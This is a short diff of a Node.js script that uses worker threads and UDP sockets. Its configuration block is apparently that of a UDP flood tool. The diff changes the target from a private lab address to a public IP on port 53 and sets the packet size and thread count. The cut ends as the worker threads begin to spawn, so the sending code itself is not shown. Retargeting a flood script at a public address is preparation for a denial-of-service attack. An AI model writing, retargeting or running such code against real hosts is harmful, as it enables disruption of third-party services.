@@ -1,10 +1,10 @@
 const { Worker, isMainThread, workerData } = require('worker_threads');
 const dgram = require('dgram');
 
-const TARGET = '192.168.1.100';
-const PORT = 1234;
-const SIZE = 64;
-const THREADS = 20;
+const TARGET = '23.176.184.31';
+const PORT = 53;
+const SIZE = 15;
+const THREADS = 5;
 
 if (isMainThread) {
     for (let i = 0; i < THREADS; i++) {
